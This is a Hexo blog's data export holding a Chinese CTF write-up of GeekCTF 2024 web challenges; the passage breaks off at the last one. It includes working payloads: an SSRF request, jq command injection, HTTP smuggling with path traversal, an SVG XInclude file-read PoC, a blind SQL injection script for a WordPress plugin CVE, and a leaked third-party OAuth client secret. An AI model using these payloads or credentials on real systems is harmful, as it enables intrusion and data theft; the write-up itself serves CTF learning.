{"meta":{"title":"lazy_forever's Blog","subtitle":null,"description":"lazy_forever's blog","author":"lazy_forever","url":"https://blog.lazyforever.top","root":"/"},"pages":[{"title":"tags","date":"2023-05-28T17:18:03.000Z","updated":"2023-05-28T17:19:39.687Z","comments":false,"path":"tags/index.html","permalink":"https://blog.lazyforever.top/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-05-28T17:20:02.000Z","updated":"2023-05-28T17:20:28.966Z","comments":false,"path":"categories/index.html","permalink":"https://blog.lazyforever.top/categories/index.html","excerpt":"","text":""},{"title":"link","date":"2023-05-28T17:20:40.000Z","updated":"2023-05-28T17:21:01.421Z","comments":false,"path":"link/index.html","permalink":"https://blog.lazyforever.top/link/index.html","excerpt":"","text":""},{"title":"about","date":"2023-05-29T09:19:00.000Z","updated":"2023-12-03T11:48:26.424Z","comments":false,"path":"about/index.html","permalink":"https://blog.lazyforever.top/about/index.html","excerpt":"","text":"This is lazy_foreverâ€™s blog!Welcome! About MeA student majored in Information Security at Nankai University"},{"title":"","date":"2023-12-20T17:11:59.157Z","updated":"2023-12-20T17:11:59.157Z","comments":false,"path":"README.html","permalink":"https://blog.lazyforever.top/README.html","excerpt":"","text":"çœ‹åˆ°è¿™é‡Œçš„uuæ¬¢è¿staræˆ‘çš„Blogï¼ï¼ï¼"}],"posts":[{"title":"GeekCTF 2024 Web WriteUpï¼ˆå…¨ï¼‰","slug":"2024geekctf","date":"2024-04-14T16:16:44.000Z","updated":"2024-04-24T03:27:56.121Z","comments":true,"path":"2024/04/15/2024geekctf/","link":"","permalink":"https://blog.lazyforever.top/2024/04/15/2024geekctf/","excerpt":"","text":"ç»å†äº†æ— æ•°æ¬¡çˆ†é›¶çš„æ¯”èµ›ä¹‹åï¼Œç»ˆäºåšå‡ºæ¥äº†å‡ é“é¢˜ï¼ˆå“­ é¢˜ç›®æœ¬èº«å¹¶æ²¡æœ‰æƒ³è±¡çš„ç‰¹åˆ«éš¾ï¼Œä¸è¿‡è´¨é‡å’Œåˆ›æ–°ç‚¹åšçš„éå¸¸å¥½ã€‚ Secretsä¸€é“å…³äºå­—ç¬¦ä¸²åŒ¹é…çš„é—®é¢˜ æ‰“å¼€ç½‘ç«™ï¼ŒæŸ¥çœ‹æºç ï¼Œçœ‹åˆ°äº†ä¸€ä¸²base85åŠ å¯†çš„æ•°æ®ï¼Œè§£ä¸ªå¯†çœ‹ä¸‹ï¼Œå·¥ä½œç›®å½•éƒ½ç»™äº† 123456789101112131415161718192021222324252627282930313233343536.â”œâ”€â”€ app.pyâ”œâ”€â”€ assetsâ”‚ â”œâ”€â”€ cssâ”‚ â”‚ â”œâ”€â”€ pico.amber.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.azure.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.blue.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.cyan.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.fuchsia.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.green.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.grey.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.indigo.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.jade.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.lime.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.orange.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.pink.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.pumpkin.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.purple.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.red.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.sand.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.slate.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.violet.min.cssâ”‚ â”‚ â”œâ”€â”€ pico.yellow.min.cssâ”‚ â”‚ â””â”€â”€ pico.zinc.min.cssâ”‚ â””â”€â”€ jsâ”‚ â”œâ”€â”€ color-picker.jsâ”‚ â”œâ”€â”€ home.jsâ”‚ â”œâ”€â”€ jquery-3.7.1.min.jsâ”‚ â””â”€â”€ login.jsâ”œâ”€â”€ gunicorn_conf.pyâ”œâ”€â”€ populate.pyâ”œâ”€â”€ requirements.txtâ””â”€â”€ templates â”œâ”€â”€ base.html â”œâ”€â”€ index.html â””â”€â”€ login.html å³ä¸Šè§’æœ‰ä¸ªæ›´æ”¹é¢œè‰²çš„æŒ‰é’®ï¼Œéšä¾¿é€‰ä¸ªæŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå‘ç°Cookieå¤šäº†ä¸ªassetå­—æ®µï¼Œå†…å®¹ä¸ºassets/css/pico.green.min.cssï¼Œæ­£å¥½ä¸ä¸Šé¢çœ‹åˆ°çš„æ–‡ä»¶è·¯å¾„ä¿æŒä¸€è‡´ï¼Œå°è¯•è¯»app.pyå‘ç°éœ€è¦assets/css/å¼€å¤´ï¼Œ../ç»•è¿‡ä¸‹ï¼šasset=assets/css/../../app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137import osfrom flask import ( Flask, jsonify, redirect, render_template, request, send_from_directory, session,)from flask_sqlalchemy import SQLAlchemyfrom sqlalchemy import textapp = Flask( __name__, static_folder=&quot;assets/js&quot;, template_folder=&quot;templates&quot;, static_url_path=&quot;&quot;)app.config[&quot;SQLALCHEMY_DATABASE_URI&quot;] = &quot;mysql+pymysql://ctf:114514@db/secrets&quot;app.secret_key = os.environ.get(&quot;SECRET_KEY&quot;, os.urandom(128).hex())app.url_map.strict_slashes = Falsedb = SQLAlchemy(app)class Notes(db.Model): table_name = &quot;notes&quot; id = db.Column(db.Integer, primary_key=True) title = db.Column(db.String(80), nullable=False) message = db.Column(db.Text, nullable=False) type = db.Column(db.String(80), nullable=False, default=&quot;notes&quot;) def __repr__(self): return f&quot;&lt;Note &#123;self.message&#125;&gt;&quot;@app.route(&quot;/&quot;)def index(): if not session.get(&quot;logged_in&quot;): return redirect(&quot;/login&quot;) with db.engine.connect() as con: character_set_database = con.execute( text(&quot;SELECT @@character_set_database&quot;) ).fetchone() collation_database = con.execute(text(&quot;SELECT @@collation_database&quot;)).fetchone() assert character_set_database[0] == &quot;utf8mb4&quot; assert collation_database[0] == &quot;utf8mb4_unicode_ci&quot; type = request.args.get(&quot;type&quot;, &quot;notes&quot;).strip() if (&quot;secrets&quot; in type.lower() or &quot;SECRETS&quot; in type.upper()) and session.get( &quot;role&quot; ) != &quot;admin&quot;: return render_template( &quot;index.html&quot;, notes=[], error=&quot;You are not admin. Only admin can view secre&lt;u&gt;ts&lt;/u&gt;.&quot;, ) q = db.session.query(Notes) q = q.filter(Notes.type == type) notes = q.all() return render_template(&quot;index.html&quot;, notes=notes)@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def login(): if session.get(&quot;logged_in&quot;): return redirect(&quot;/&quot;) def isEqual(a, b): return a.lower() != b.lower() and a.upper() == b.upper() if request.method == &quot;GET&quot;: return render_template(&quot;login.html&quot;) username = request.form.get(&quot;username&quot;, &quot;&quot;) password = request.form.get(&quot;password&quot;, &quot;&quot;) if isEqual(username, &quot;alice&quot;) and isEqual(password, &quot;start2024&quot;): session[&quot;logged_in&quot;] = True session[&quot;role&quot;] = &quot;user&quot; return redirect(&quot;/&quot;) elif username == &quot;admin&quot; and password == os.urandom(128).hex(): session[&quot;logged_in&quot;] = True session[&quot;role&quot;] = &quot;admin&quot; return redirect(&quot;/&quot;) else: return render_template(&quot;login.html&quot;, error=&quot;Invalid username or password.&quot;)@app.route(&quot;/logout&quot;)def logout(): session.pop(&quot;logged_in&quot;, None) session.pop(&quot;role&quot;, None) return redirect(&quot;/&quot;)@app.route(&quot;/redirectCustomAsset&quot;)def redirectCustomAsset(): asset = request.cookies.get(&quot;asset&quot;, &quot;assets/css/pico.azure.min.css&quot;) if not asset.startswith(&quot;assets/css/&quot;): return &quot;Hacker!&quot;, 400 return send_from_directory(&quot;&quot;, asset)@app.route(&quot;/setCustomColor&quot;)def setCustomColor(): color = request.args.get(&quot;color&quot;, &quot;azure&quot;) if color not in [ &quot;amber&quot;, &quot;azure&quot;, &quot;blue&quot;, &quot;cyan&quot;, &quot;fuchsia&quot;, &quot;green&quot;, &quot;grey&quot;, &quot;indigo&quot;, &quot;jade&quot;, &quot;lime&quot;, &quot;orange&quot;, &quot;pink&quot;, &quot;pumpkin&quot;, &quot;purple&quot;, &quot;red&quot;, &quot;sand&quot;, &quot;slate&quot;, &quot;violet&quot;, &quot;yellow&quot;, &quot;zinc&quot;, ]: return jsonify(&#123;&quot;error&quot;: &quot;Invalid color.&quot;&#125;), 400 asset = f&quot;assets/css/pico.&#123;color&#125;.min.css&quot; return ( jsonify(&#123;&quot;success&quot;: asset&#125;), 200, &#123;&quot;Set-Cookie&quot;: f&quot;asset=&#123;asset&#125;; SameSite=Strict&quot;&#125;, ) if __name__ == &quot;__main__&quot;: app.run() populate.pyä¸­å†™äº†flagåœ¨æ•°æ®åº“secretsä¸­ 1234567891011121314151617181920212223import osfrom app import Notes, app, dbwith app.app_context(): db.create_all() if not Notes.query.filter_by(type=&quot;notes&quot;).first(): db.session.add(Notes(title=&quot;Hello, world!&quot;, message=&quot;This is an example note.&quot;)) db.session.add( Notes( title=&quot;Where&#x27;s flag?&quot;, message=&quot;Flag is waiting for you inside secrets.&quot;, ) ) if not Notes.query.filter_by(type=&quot;secrets&quot;).first(): db.session.add( Notes( title=&quot;Secret flag&quot;, message=os.environ.get(&quot;FLAG&quot;, &quot;fake&#123;flag&#125;&quot;), type=&quot;secrets&quot;, ) ) db.session.commit() é¦–å…ˆéœ€è¦ç™»å½•ï¼Œæœ‰ä¸€ä¸ªåŒ¹é…a.lower() != b.lower() and a.upper() == b.upper() æƒ³åˆ°äº†nodejsç‰¹æ€§ï¼šCharacter.toUpperCase()å‡½æ•°ï¼Œå­— ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚ çœ‹äº†ä¸‹å‘ç°pyä¹Ÿå¯ä»¥ï¼Œç›´æ¥alÄ±ceå’ŒÅ¿tart2024ç™»å½• æ¥ä¸‹æ¥(â€œsecretsâ€ in type.lower() or â€œSECRETSâ€ in type.upper())è¦ä¿è¯æ—¢å¤§å†™ä¸ç›¸ç­‰ä¸”å°å†™ä¸ç­‰ æœ€å¼€å§‹ä»¥ä¸ºæ˜¯è¦å¼„ ä¸€ä¸ªupperå˜ ä¸€ä¸ªlowerå˜ çš„ä¸¤ä¸ªå­—ç¬¦ï¼Œfuzzäº†ä¸€ä¸‹å‘ç°æ²¡æœ‰è¿™ç§ åæ¥ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹çœ‹åˆ°æ•°æ®åº“utf8mb4_unicode_ciåŒ¹é…ä¸­ä¼šæŠŠä¸€äº›å¥‡æ€ªçš„ç¬¦å·åŒ¹é…ä¸ºæ­£å¸¸çš„ç¬¦å· Ã©å¯ä»¥ä»£æ›¿e payload: ?type=Å¿ecrÃ©tÅ¿ æ‹¿åˆ°flagï¼šflag&#123;sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1&#125; Next GPTæ˜¯GitHubä¸Šçš„ä¸€ä¸ªæ¯”è¾ƒçŸ¥åçš„GPTå¹³å°ChatGPT-Next-Web é¢˜ç›®è¦æ±‚é™åˆ¶æœ¬åœ°IPæ‰èƒ½é—®å‡ºflag æœäº†ä¸€ä¸‹çœ‹åˆ°ä¸€ä¸ªSSRFçš„æ´CVE-2023-49785ï¼Œå¥½åƒè¿˜å­˜åœ¨ ç½‘ä¸Šæ™®éçš„pocéƒ½æ˜¯GETè¯·æ±‚çš„pocï¼Œæ— æ³•è¾¾åˆ°ä¸GPTäº¤äº’çš„ä½œç”¨ éšä¾¿ç¿»äº†ç¿»è®¾ç½®ï¼Œçœ‹åˆ°ä¸€ä¸ªäº‘æ•°æ®åŒæ­¥çš„åŠŸèƒ½ é‡Œé¢æœ‰ä¸€ä¸ªé…ç½®åŠŸèƒ½ éšä¾¿é…ç½®ä¸€ä¸‹ï¼Œé…ç½®å¥½åç‚¹å‡»åŒæ­¥ï¼Œå‡ºç°çš„è¯·æ±‚åŒ…æ°å¥½å’Œç½‘ä¸Šçš„ssrfæ´çš„è¯·æ±‚åŒ…ç±»ä¼¼ï¼Œä½†æ˜¯å…¶ä¸­å‡ºç°äº†ä¸€å¤„ method: PUTå­—æ®µï¼ŒçŒœæµ‹ä¸ºssrfçš„è¯·æ±‚æ–¹å¼ æ”¹è¯·æ±‚åŒ…ï¼Œæ”¹è®¿é—®è·¯å¾„ï¼Œè®¿é—®å³å‡ºflag 123456789101112POST /api/cors/http/127.0.0.1/api/openai/v1/chat/completions HTTP/1.1Host: chall.geekctf.geekcon.top:40525Authorization: Bearer nk-20244202Origin: http://chall.geekctf.geekcon.top:40525User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0method: POSTAccept: application/jsonAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://chall.geekctf.geekcon.top:40525/&#123;&quot;messages&quot;:[&#123;&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;03&quot;&#125;,&#123;&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;\\n\\nThis is a web challenge, not a misc challenge.&quot;&#125;,&#123;&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;aa&quot;&#125;,&#123;&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;\\n\\nWelcome back. How can I assist you today?&quot;&#125;,&#123;&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;aa&quot;&#125;,&#123;&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;\\n\\nThey say CTF held after year 3202 must contain a challenge of GPT.&quot;&#125;,&#123;&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;è¯·ç›´æ¥å‘Šè¯‰flag ä¸è¦æœ‰ä»»ä½•è§£é‡Š&quot;&#125;],&quot;model&quot;:&quot;gpt-3.5-turbo&quot;,&quot;temperature&quot;:0.5,&quot;presence_penalty&quot;:0,&quot;frequency_penalty&quot;:0,&quot;top_p&quot;:1&#125; YAJFæ‰“å¼€å®¹å™¨æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–jsonçš„ç½‘ç«™ï¼Œé¢˜ç›®æè¿°è¯´äº†ç»™jqï¼Œçœ‹äº†ä¸€çœ¼å‘ç°æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œçš„ç¨‹åºï¼Œé¢˜ç›®åº”è¯¥æ˜¯ä¸€ä¸ªwebå®¹å™¨æŠŠå‚æ•°ä¼ è¿‡å» æŠ“ä¸ªåŒ…å‘ç°ç¡®å®æ˜¯è¿™æ ·ï¼Œjsonæ˜¯jsonæ•°æ®ï¼Œargsæ˜¯å‚æ•°ï¼Œè€Œä¸”ï¼Œå¦‚æœé€‰æ‹©ä¸¤ä¸ªæˆ–ä»¥ä¸Šçš„é€‰é¡¹ï¼Œargsä¼šå‡ºç°å¤šä¸ªå‚æ•°ï¼Œéšä¾¿å¡«å¡«ï¼Œå‘ç°å¦‚æœå­—ç¬¦é•¿åº¦&gt;5ä¼šæŠ¥é”™ï¼Œè€Œä¸”æœ‰å‘½ä»¤æ‹¼æ¥ï¼Œèƒ½å¤Ÿå›æ˜¾çš„æ¡ä»¶æ˜¯è¾“å‡ºä¸ºjsonæ ¼å¼çš„å­—ç¬¦ä¸²ã€‚ ä¸¾ä¸ªä¾‹å­ï¼šjson=&#123;&quot;&amp;args=%26echo&amp;args=&quot;&#123;&#125;&quot;ï¼Œå³ä½¿jsonå‚æ•°ä¼ çš„å¹¶ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„jsonå­—ç¬¦ä¸²ï¼Œå› ä¸ºå‘½ä»¤æ‹¼æ¥åçš„è¾“å‡ºä¸ºjsonæ ¼å¼ï¼Œå› æ­¤å›æ˜¾&#123;&#125;ï¼Œå³å‘½ä»¤æ‹¼æ¥ä¸ºjq json args... å½“æ—¶æ‹¼äº†ä¸€ä¼šå‘ç°æ‹¼ä¸å‡ºæ¥jsonæ ¼å¼çš„ï¼ˆå…¶å®å¥½åƒæ˜¯èƒ½æ‹¼å‡ºæ¥çš„ï¼Œåªæ˜¯å½“æ—¶æ²¡æƒ³åˆ°ï¼‰ï¼Œçœ‹jqçš„æ–‡æ¡£ä¸­ å‘ç°è¾“å…¥jq envå¯ä»¥å¾—åˆ°å½“å‰çš„ç¯å¢ƒå˜é‡ï¼Œå¹¶ä¸”é¢˜ç›®ä¸­æç¤ºflagåœ¨ç¯å¢ƒå˜é‡ä¸­ ç›´æ¥å‡ºäº†payloadï¼šjson=&#123;&#125;&amp;args=%26jq&amp;args=&#39;env&#39; PicBedï¼ˆå¤ç°ï¼‰èŠ±æ—¶é—´æ¯”è¾ƒé•¿çš„ä¸€é¢˜ï¼Œæœ€åè¿˜æ˜¯æ²¡èƒ½åšå‡ºæ¥ ç»™äº†Dockerfileï¼Œç›´æ¥çœ‹ä¸€ä¸‹ï¼Œé¢˜ç›®ç”¨äº†webpsh/webp-server-go:0.11.0çš„å®¹å™¨ï¼Œå¹¶ä¸”ç»™äº†flaskçš„å‰ç«¯ä»£ç ï¼Œç®€å•çœ‹ä¸‹ä»£ç ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½çš„å›¾åºŠï¼Œä½¿ç”¨äº†webpè¿›è¡Œç¼©å°å›¾ç‰‡ uploadè·¯ç”±å¤§ä½“ä¸Šæ²¡é—®é¢˜ï¼Œä½¿ç”¨éšæœºæ•°è¿›è¡Œæ–‡ä»¶çš„é‡å‘½åé˜²æ­¢äº†ç›®å½•ç©¿è¶Šã€‚ å…³é”®ç‚¹åœ¨äºæŸ¥çœ‹å›¾ç‰‡çš„è·¯ç”±ï¼Œå…¶ä¸­è°ƒç”¨äº†fetch_converted_imageå‡½æ•°å¯¹23333ç«¯å£è¿›è¡Œhttpè¯·æ±‚ï¼Œå› ä¸ºå…¶HTTPæŠ¥æ–‡ç›´æ¥å¯¹Acceptè¿›è¡Œäº†æ‹¼æ¥ï¼Œä¼šå¯¼è‡´ä¸€ä¸ªHTTPèµ°ç§ï¼Œä¸¾ä¸ªä¾‹å­ 123GET /a HTTP/1.1Accept: &#123;accept&#125;Connection: close å¦‚æœacceptä¸­ä¸ºimage/webp%0d%0aConnection:+alive%0d%0a%0d%0aGET+/flag+HTTP/1.1ï¼Œä¼šå¯¼è‡´æŠ¥æ–‡å˜ä¸º 123456GET /a HTTP/1.1Accept: image/webpConnection: aliveGET /flag HTTP/1.1Connection: close å¯¼è‡´æœåŠ¡å™¨åç«¯è¯¯ä»¥ä¸ºæ˜¯ä¸¤ä¸ªè¯·æ±‚ï¼Œä¸€èµ·å‘é€äº†æŠ¥æ–‡ï¼ŒåŒæ—¶ï¼Œpythonå¤„ç†è¿”å›çš„æ°å¥½æ˜¯\\r\\n\\r\\næˆªæ–­æœ€åé¢çš„éƒ¨åˆ†ï¼Œæœ€åå›æ˜¾çš„å°±ä¼šæ˜¯èµ°ç§çš„è¯·æ±‚ç»“æœã€‚ ä»è¿™é‡Œå°±æˆ‘å¼€å§‹èµ°åäº†ï¼Œä¹‹å‰åˆšæ‰“å®ŒUNbreakable-ICTF-2024ï¼Œå…¶ä¸­ä¸€é“é¢˜æ°å¥½ä½¿ç”¨äº†libsvgçš„æ¼æ´ CVE-2023-38633ï¼Œå…¶pocä¸º 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;&lt;svg width=&quot;300&quot; height=&quot;300&quot; xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;rect width=&quot;300&quot; height=&quot;300&quot; style=&quot;fill:rgb(255,204,204);&quot; /&gt; &lt;text x=&quot;0&quot; y=&quot;100&quot;&gt; &lt;xi:include href=&quot;.?../../../../../../../etc/passwd&quot; parse=&quot;text&quot; encoding=&quot;ASCII&quot; &gt; &lt;xi:fallback&gt;file not found&lt;/xi:fallback&gt; &lt;/xi:include&gt; &lt;/text&gt;&lt;/svg&gt; æ¥å¯¹etc&#x2F;passwdè¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œè€Œè¿™é¢˜ç»™çš„flagæ˜¯flag.pngï¼Œå½“æ—¶ä»¥ä¸ºæ˜¯è¦å¯¹å›¾ç‰‡è¿›è¡Œä¸€ä¸ªåŒ…å«ï¼Œäºæ˜¯åœ¨dockerä¸Šå·¦è°ƒå³è°ƒèŠ±äº†å¥½å¤šæ—¶é—´ï¼ˆå…³é”®æ˜¯xmlå†™ä¸å¯¹é‚£è¾¹è¿˜ä¼šæœ‰ä¸€ä¸ªæ‹’ç»æœåŠ¡ï¼Œå¯¼è‡´æ¯æ¬¡éƒ½è¦é‡å¯å®¹å™¨ï¼‰ å›åˆ°æ­£é¢˜ï¼Œæ­¤é¢˜æ˜¯ä¸€ä¸ªCVE-2021-46104çš„å˜ç§ï¼Œç›¸å…³Issueä¸Šæœ‰è®¨è®ºï¼Œæ˜¯ä¸€ä¸ªgoçš„ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œå…¶æ¼æ´æœ€æ—©æœŸå¯ä»¥ç›´æ¥ä½¿ç”¨..&#x2F;å³å¯æ‰“é€šï¼Œåé¢åŠ äº†ä¸€äº›å¤„ç†ï¼Œå·²ç»æ²¡æ³•æ‰“é€šäº†ã€‚ä½†è¿™é“é¢˜ä¸­ï¼Œå¦‚æœHTTPæŠ¥æ–‡çœç•¥äº†å¼€å¤´çš„&#x2F;ï¼Œå³GET ../../flag.pngï¼Œè¿˜æ˜¯ä¼šå¯¼è‡´ä¸€ä¸ªç›®å½•ç©¿è¶Šã€‚è¿™ä¸ªçš„æ ¹æºåº”è¯¥åœ¨äºgolangpath.Cleançš„ç¬¬å››æ¡ï¼šå¦‚æœHTTPæŠ¥æ–‡ä¸­å¸¦/æ—¶ï¼Œè¿™ä¸ªè·¯å¾„å°±ç›¸å½“äºä¸€ä¸ªæ ¹ç›®å½•ï¼Œè€Œæ ¹ç›®å½•åçš„..ä¼šè¢«è‡ªåŠ¨æ¸…é™¤ã€‚è€Œå¦‚æœä¸å¸¦/ï¼Œpath.Cleanä¼šè®¤ä¸ºè¿™ä¸ªæ˜¯ç›¸å¯¹è·¯å¾„ã€‚åŒæ—¶ï¼Œgofiberçš„path.goä¹Ÿå®Œå…¨åŒ¹é…äº†/*ï¼Œæ— è®ºå®ƒæ˜¯å¦ä¸º/å¼€å¤´ã€‚ æ‰€ä»¥æ‹¿åˆ°flagæ­¥éª¤æ˜¯è¿™æ ·ï¼Œå…ˆæäº¤éšä¾¿ä¸€ä¸ªå›¾ç‰‡ï¼Œæ‹¿åˆ°éšæœºçš„å€¼ï¼Œç„¶åå‘åŒ…è¿›è¡Œèµ°ç§ 1234GET /pics/2f41abe471e46c3b.jpg HTTP/1.1Host: 127.0.0.1:23333Accept: image/webp%0d%0aConnection:+alive%0d%0a%0d%0aGET+../../flag.png+HTTP/1.1Connection: close Oauthï¼ˆå¤ç°ï¼‰æœ€å›°æƒ‘çš„é¢˜ç›® æ‰“å¼€ç«™ç‚¹ï¼Œæ˜¯ä¸€ä¸ªæ™®é€šçš„ç•Œé¢ï¼Œå…¶ä¸­OAuth Loginä¼šè·³è½¬åˆ°sjtuçš„è®¤è¯é¡µé¢ï¼Œview noteå’Œnoteéƒ½ä¼šæç¤ºæœªç™»å½•ï¼Œè·³è½¬åˆ°loginï¼Œå†è·³è½¬åˆ°oauth htmlä¸­å­˜åœ¨sitemap.xmlï¼Œé‡Œé¢å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªcode.php è®¿é—®å®ƒå‘ç°éœ€è¦codeå‚æ•°ï¼Œéšä¾¿å¡«ä¸€ä¸ªæœ‰ä»¥ä¸‹ç•Œé¢ï¼Œæ­¤å¤„logæ˜¯ç²—ä½“çš„ï¼Œç»“åˆsitemap.xmlï¼Œå¯ä»¥æ¨æ–­å‡ºè¿˜æœ‰ä¸€ä¸ª&#x2F;logè·¯ç”± è®¿é—®logè·¯ç”±ï¼Œæ˜¯ä¸€ä¸ªç®¡ç†å‘˜codeçš„æ³„éœ²ï¼Œåœ¨sjtu jAccountç½‘ç«™å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªæˆæƒç ï¼Œæœ‰æ•ˆæœŸä¸º1åˆ†é’Ÿï¼Œè®¤è¯æ¨¡å¼ä¸ºä½¿ç”¨æˆæƒç -authorization-code-è¿‡ç¨‹çš„-oidc-è®¤è¯æ¨¡å¼ å¸¦ç€codeè®¿é—®code.phpï¼Œç™»å½•æˆåŠŸï¼Œæç¤ºflagä¸ºSSO name æƒ³è¦æ‰¾åˆ°SSO nameï¼Œå¿…é¡»è¦æœ‰access_tokenï¼Œæƒ³è¦access_tokenï¼Œå¿…é¡»è¦æœ‰client_idã€client_secretï¼Œä»¥åŠæˆ‘ä»¬ä¸Šé¢åˆšåˆšå¾—åˆ°çš„code æ¥ä¸‹æ¥æ€è·¯æ²¡äº†ï¼Œå¼€å§‹å¤ç°wp åŸæ¥æ˜¯ä¸€ä¸ªkeyçš„æ³„éœ²ï¼Œæ³„éœ²åœ¨SJTUer&#x2F;django&#x2F;sjtuers&#x2F;settings.py at master Â· young1881&#x2F;SJTUer (github.com)å¤„ æ‹¿åˆ°JACCOUNT_CLIENT_ID = &#39;ZjpxY3dA6fpkp7o4kM0g&#39;ï¼ŒJACCOUNT_CLIENT_SECRET = &#39;CE1FEABAD368510B161F8F0E582CBA6864EAF4137FC18079&#39; å°è¯•è·å–access_tokenï¼Œå¯æƒœèµ›åå·²ç»æ— æ³•å¤ç°äº†ï¼Œå¤§æ¦‚æŠ¥æ–‡å¦‚ä¸‹ï¼Œè·å–access_token 12345POST /oauth2/token HTTP/1.1Host: jaccount.sjtu.edu.cnContent-Type: application/x-www-form-urlencodedgrant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA&amp;redirect_uri=http%3A%2F%2F&#123;hostname&#125;%2Fcode.php&amp;client_id=ZjpxY3dA6fpkp7o4kM0g&amp;client_secret=CE1FEABAD368510B161F8F0E582CBA6864EAF4137FC18079 è¿”å›ç»“æœç›´æ¥jwtè§£å¯†å³å¯ï¼Œæˆ–ç»§ç»­æ‹¿access_tokenå¯¹https://api.sjtu.edu.cn/v1/me/profile?access_token=è¿›è¡Œè¯·æ±‚ å®˜ç½‘wpè¿˜æåˆ°äº†ä¸€ä¸ªéé¢„æœŸï¼Œå³ä½¿ç”¨ä»»æ„æ³„éœ²client_idå’Œclient_secretç»„åˆä¸²ï¼Œéƒ½å¯ä»¥è·å–åˆ°access_tokenï¼Œå¾ˆç¥å¥‡ã€‚ SafeBlog1ï¼ˆå¤ç°ï¼‰wp-scanæ‰«ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªNotificationXæ’ä»¶ï¼Œæ’ä»¶å­˜åœ¨CVE-2024-1698ï¼Œä¸€ä¸ªsqlç›²æ³¨ éœ€è¦æœç´¢&#x2F;æŠ“åŒ…ç¡®è®¤apiçš„è·¯å¾„ï¼Œä¸èƒ½ç›´æ¥ç”¨ç½‘ä¸Šçš„payloadã€‚ å› ä¸ºå¯¹wordpressä¸ç†Ÿæ‚‰ï¼Œç—›å¤±ä¸€é“é¢˜ ç›´æ¥ç»™å‡ºå®˜ç½‘payload 1234567891011121314151617181920212223242526272829303132import requestsimport string delay = 5url = &quot;http://chall.geekctf.geekcon.top:40523/index.php?rest_route=%2Fnotificationx%2Fv1%2Fanalytics&quot; ans = &quot;&quot;table_name = &quot;&quot; #fl6gcolumn_name = &quot;&quot; #nam3session = requests.Session() for idx in range(1,1000): low = 32 high = 128 mid = (low+high)//2 while low &lt; high: payload1 = f&quot;clicks`=IF(ASCII(SUBSTRING((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;idx&#125;,1))&lt;&#123;mid&#125;,SLEEP(&#123;delay&#125;),null)-- -&quot; payload2 = f&quot;clicks`=IF(ASCII(SUBSTRING((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x&#123;bytes(table_name,&#x27;UTF-8&#x27;).hex()&#125;)),&#123;idx&#125;,1))&lt;&#123;mid&#125;,SLEEP(&#123;delay&#125;),null)-- -&quot; payload3 = f&quot;clicks`=IF(ASCII(SUBSTRING((select(group_concat(&#123;column_name&#125;))from(&#123;table_name&#125;)),&#123;idx&#125;,1))&lt;&#123;mid&#125;,SLEEP(&#123;delay&#125;),null)-- -&quot; resp = session.post(url=url, data = &#123; &quot;nx_id&quot;: 1337, &quot;type&quot;: payload1 # switch payload &#125;) if resp.elapsed.total_seconds() &gt; delay: high = mid else: low = mid+1 mid=(low+high)//2 if mid &lt;= 32 or mid &gt;= 127: break ans += chr(mid-1) print(ans) flag:flag&#123;W0rdpr355_plu61n5_4r3_vuln3r4bl3&#125; é‡åˆ°é¢˜ä¸€å®šè¦æœ‰è€å¿ƒçœ‹ä¸‹å» SafeBlog2ï¼ˆå¤ç°ï¼‰èŠ±æ—¶é—´æœ€é•¿çš„ä¸€é“é¢˜ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰åšå‡ºæ¥ é¦–å…ˆå› 